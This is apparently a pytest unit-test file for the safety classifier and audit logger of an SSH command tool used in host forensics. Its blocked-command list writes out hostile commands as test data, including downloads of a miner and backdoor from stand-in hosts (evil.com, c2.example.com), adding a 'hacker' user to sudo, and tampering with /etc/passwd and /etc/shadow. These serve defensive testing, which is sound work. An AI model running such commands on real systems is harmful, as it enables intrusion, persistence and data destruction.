"""
Unit tests for ssh_host_cmd tool — safety classifier and audit logger.
"""

import json
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

from flocks.tool.security.ssh_host_cmd import (
    SafetyDecision,
    classify_command,
    _split_pipeline,
    _get_base_command,
    _strip_quoted,
    _classify_segment,
    _load_user_allowlist,
    _save_to_user_allowlist,
    USER_ALLOWLIST_PATH,
)
from flocks.tool.security.ssh_utils import audit_log, AUDIT_LOG_PATH


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class TestSplitPipeline:
    def test_single_command(self):
        assert _split_pipeline("ps aux") == ["ps aux"]

    def test_pipe(self):
        parts = _split_pipeline("ps aux | grep xmrig")
        assert len(parts) == 2
        assert "ps aux" in parts

    def test_semicolon(self):
        parts = _split_pipeline("uname -a; hostname")
        assert len(parts) == 2

    def test_and_and(self):
        parts = _split_pipeline("ls /tmp && cat /etc/passwd")
        assert len(parts) == 2

    def test_complex_chain(self):
        parts = _split_pipeline("ps aux | grep ssh | head -10")
        assert len(parts) == 3

    def test_empty(self):
        assert _split_pipeline("") == []

    def test_pipe_inside_double_quotes_not_split(self):
        """Pipe char inside double quotes should not cause a split."""
        parts = _split_pipeline('grep "a|b" /var/log/auth.log')
        assert len(parts) == 1
        assert parts[0] == 'grep "a|b" /var/log/auth.log'

    def test_semicolon_inside_single_quotes_not_split(self):
        parts = _split_pipeline("echo 'a;b' | cat")
        assert len(parts) == 2
        assert parts[0] == "echo 'a;b'"

    def test_mixed_quotes_and_pipes(self):
        parts = _split_pipeline("""grep -E "Failed|Accepted" /var/log/auth.log | head -20""")
        assert len(parts) == 2
        assert 'grep -E "Failed|Accepted" /var/log/auth.log' == parts[0]


class TestGetBaseCommand:
    def test_simple(self):
        assert _get_base_command("ps aux") == "ps"

    def test_full_path(self):
        assert _get_base_command("/usr/bin/ps aux") == "ps"

    def test_with_env_var(self):
        result = _get_base_command("LANG=C ps aux")
        assert result == "ps"

    def test_with_multiple_env_vars(self):
        result = _get_base_command("LANG=C LC_ALL=C TZ=UTC ps aux")
        assert result == "ps"

    def test_empty(self):
        assert _get_base_command("") == ""


class TestStripQuoted:
    def test_double_quotes(self):
        assert ">" not in _strip_quoted('awk "{if ($1 > 0) print}"')

    def test_single_quotes(self):
        assert ">" not in _strip_quoted("awk '{if ($1 > 0) print}'")

    def test_no_quotes(self):
        assert ">" in _strip_quoted("echo hello > /tmp/file")

    def test_mixed(self):
        result = _strip_quoted("""grep "Failed|Accepted" file""")
        assert "|" not in result


# ---------------------------------------------------------------------------
# BLOCKED commands
# ---------------------------------------------------------------------------

class TestBlockedCommands:
    """Destructive commands must always be blocked."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/evil",
        "rm /etc/passwd",
        "rmdir /var/log",
        "mkdir /tmp/newdir",
        "touch /tmp/newfile",
        "cp /etc/passwd /tmp/passwd.bak",
        "mv /tmp/a /tmp/b",
        "ln -s /etc/passwd /tmp/pw",
        "chmod 777 /etc/shadow",
        "chown root:root /tmp/file",
        "chattr +i /etc/passwd",
        "sudo cat /etc/shadow",
        "su -",
        "passwd root",
        "useradd hacker",
        "userdel admin",
        "usermod -aG sudo hacker",
        "kill -9 1234",
        "killall nginx",
        "pkill sshd",
        "apt install netcat",
        "apt-get install -y curl",
        "yum install wget",
        "dnf install python3",
        "pip install paramiko",
        "npm install express",
        "systemctl stop sshd",
        "systemctl start malware",
        "systemctl restart nginx",
        "systemctl enable backdoor",
        "systemctl disable firewall",
        "wget http://evil.com/miner",
        "curl -o /tmp/miner http://evil.com/miner",
        "curl --output /tmp/backdoor http://c2.example.com/b",
        "echo malware > /tmp/evil.sh",
        "cat /etc/passwd >> /tmp/data.txt",
        "tee /etc/cron.d/evil",
        "sed -i 's/root/hacker/' /etc/passwd",
        "find / -exec rm {} \\;",
        "find /tmp -delete",
    ])
    def test_blocked(self, cmd):
        decision, reason = classify_command(cmd, set())
        assert decision == SafetyDecision.BLOCKED, (
            f"Expected BLOCKED for: {cmd!r}, got {decision} ({reason})"
        )

    def test_blocked_in_pipeline(self):
        """A blocked command anywhere in a pipeline blocks the whole thing."""
        decision, _ = classify_command("ps aux | rm -rf /", set())
        assert decision == SafetyDecision.BLOCKED

    def test_blocked_with_and(self):
        decision, _ = classify_command("uname -a && sudo cat /etc/shadow", set())
        assert decision == SafetyDecision.BLOCKED


# ---------------------------------------------------------------------------
# ALLOWED commands
# ---------------------------------------------------------------------------

class TestAllowedCommands:
    """Standard read-only forensic commands must be auto-allowed."""

    @pytest.mark.parametrize("cmd", [
        "ps aux",
        "ps auxf",
        "pstree",
        "top -bn1",
        "top -bn1 | head -20",
        "uname -a",
        "uname -r",
        "hostname",
        "uptime",
        "id",
        "whoami",
        "who",
        "w",
        "last -n 20",
        "lastlog",
        "ss -tunap",
        "ss -tlnup",
        "netstat -tunap",
        "ip addr",
        "ip route",
        "ifconfig",
        "arp -n",
        "ls -la /tmp",
        "ls -la /dev/shm",
        "cat /etc/passwd",
        "cat /var/log/auth.log",
        "head -100 /var/log/syslog",
        "tail -500 /var/log/auth.log",
        "grep 'Failed password' /var/log/auth.log",
        "grep -r 'eval' /var/www",
        "find / -maxdepth 4 -newer /etc/passwd -type f",
        "find /tmp -type f",
        "stat /tmp",
        "file /usr/bin/ps",
        "md5sum /usr/bin/ps",
        "sha256sum /usr/bin/ps",
        "strings /tmp/suspicious",
        "hexdump -C /tmp/binary | head -20",
        "lsof -p 1234",
        "lsof -i",
        "crontab -l",
        "systemctl status sshd",
        "systemctl list-units --type=service",
        "dpkg -l",
        "rpm -qa",
        "pip list",
        "env",
        "printenv",
        "history",
        "df -h",
        "free -m",
        "dmesg | tail -50",
        "journalctl -n 100 --no-pager",
        "cat /root/.ssh/authorized_keys",
        "cat /etc/crontab",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "cat /etc/sudoers",
        "cat /proc/1234/cmdline | tr '\\0' ' '",
        "ls -la /proc/1234/exe",
        "ps aux | grep xmrig | grep -v grep",
        "ss -tunap | grep ESTAB",
        "grep 'Accepted' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn",
        # awk with comparison operators inside quotes must not be blocked
        "ps aux | awk '{if ($3 > 90) print}'",
        "awk '{if ($1 > 0) print}' /var/log/syslog",
    ])
    def test_allowed(self, cmd):
        decision, reason = classify_command(cmd, set())
        assert decision == SafetyDecision.ALLOWED, (
            f"Expected ALLOWED for: {cmd!r}, got {decision} ({reason})"
        )

    def test_systemctl_readonly_subcommands(self):
        for subcmd in ["status sshd", "list-units", "list-timers", "show nginx", "is-active sshd"]:
            cmd = f"systemctl {subcmd}"
            decision, _ = classify_command(cmd, set())
            assert decision == SafetyDecision.ALLOWED, f"systemctl {subcmd} should be ALLOWED"

    def test_dpkg_readonly(self):
        for args in ["-l", "--list", "-L bash", "-s bash"]:
            cmd = f"dpkg {args}"
            decision, _ = classify_command(cmd, set())
            assert decision == SafetyDecision.ALLOWED, f"dpkg {args} should be ALLOWED"

    def test_crontab_list(self):
        decision, _ = classify_command("crontab -l", set())
        assert decision == SafetyDecision.ALLOWED

    def test_user_allowlist_overrides_needs_confirm(self):
        """Commands in user allowlist are always allowed regardless of classifier."""
        cmd = "python3 -c \"import os; print(os.listdir('/tmp'))\""
        allowlist = {cmd.strip()}
        decision, reason = classify_command(cmd, allowlist)
        assert decision == SafetyDecision.ALLOWED
        assert reason == "user-allowlist"


# ---------------------------------------------------------------------------
# NEEDS_CONFIRM commands
# ---------------------------------------------------------------------------

class TestNeedsConfirmCommands:
    """Gray-area commands should go to LLM evaluation."""

    @pytest.mark.parametrize("cmd", [
        "python3 -c \"import os; print(os.listdir('/'))\"",
        "python -c \"open('/etc/passwd').read()\"",
        "perl -e \"print 'hello'\"",
        "curl http://metadata.internal/latest",
        "nc -z 192.168.1.1 22",
        "base64 /etc/passwd",
        "dd if=/dev/sda bs=512 count=1",
    ])
    def test_needs_confirm(self, cmd):
        decision, _ = classify_command(cmd, set())
        assert decision == SafetyDecision.NEEDS_CONFIRM, (
            f"Expected NEEDS_CONFIRM for: {cmd!r}, got {decision}"
        )


# ---------------------------------------------------------------------------
# Blocked in pipeline
# ---------------------------------------------------------------------------

class TestPipelineSafety:
    def test_read_then_write_is_blocked(self):
        decision, _ = classify_command("cat /etc/passwd > /tmp/pw.txt", set())
        assert decision == SafetyDecision.BLOCKED

    def test_read_pipe_grep_is_allowed(self):
        decision, _ = classify_command("cat /var/log/auth.log | grep Failed", set())
        assert decision == SafetyDecision.ALLOWED

    def test_safe_chain_allowed(self):
        cmd = "ps aux | grep -i xmrig | grep -v grep"
        decision, _ = classify_command(cmd, set())
        assert decision == SafetyDecision.ALLOWED


# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

class TestAuditLogger:
    def test_audit_log_creates_file(self, tmp_path):
        log_path = tmp_path / "audit" / "ssh_commands.log"
        with patch("flocks.tool.security.ssh_utils.AUDIT_LOG_PATH", log_path):
            audit_log(
                session_id="test-session",
                host="192.168.1.1",
                username="root",
                port=22,
                command="ps aux",
                decision="ALLOWED",
                source="static-rule",
                exit_code=0,
                output_bytes=1024,
                elapsed_ms=234,
            )
        assert log_path.exists()
        content = log_path.read_text()
        assert "ps aux" in content
        assert "ALLOWED" in content
        assert "static-rule" in content
        assert "192.168.1.1" in content
        assert "test-session" in content

    def test_audit_log_appends(self, tmp_path):
        log_path = tmp_path / "audit" / "ssh_commands.log"
        with patch("flocks.tool.security.ssh_utils.AUDIT_LOG_PATH", log_path):
            audit_log("s1", "host1", "root", 22, "ps aux", "ALLOWED", "static-rule")
            audit_log("s1", "host1", "root", 22, "ss -tunap", "ALLOWED", "static-rule")
        content = log_path.read_text()
        assert content.count("cmd:") == 2


# ---------------------------------------------------------------------------
# User allowlist
# ---------------------------------------------------------------------------

class TestUserAllowlist:
    def test_save_and_load(self, tmp_path):
        allowlist_path = tmp_path / "ssh_allowed_commands.json"
        with patch("flocks.tool.security.ssh_host_cmd.USER_ALLOWLIST_PATH", allowlist_path):
            _save_to_user_allowlist("python3 -c \"print('hello')\"")
            _save_to_user_allowlist("curl http://internal-api/status")
            loaded = _load_user_allowlist()

        assert "python3 -c \"print('hello')\"" in loaded
        assert "curl http://internal-api/status" in loaded

    def test_save_deduplicates(self, tmp_path):
        allowlist_path = tmp_path / "ssh_allowed_commands.json"
        with patch("flocks.tool.security.ssh_host_cmd.USER_ALLOWLIST_PATH", allowlist_path):
            _save_to_user_allowlist("curl http://api/check")
            _save_to_user_allowlist("curl http://api/check")
            loaded = _load_user_allowlist()

        assert len([c for c in loaded if c == "curl http://api/check"]) == 1

    def test_load_missing_file_returns_empty(self, tmp_path):
        missing_path = tmp_path / "nonexistent.json"
        with patch("flocks.tool.security.ssh_host_cmd.USER_ALLOWLIST_PATH", missing_path):
            result = _load_user_allowlist()
        assert result == set()
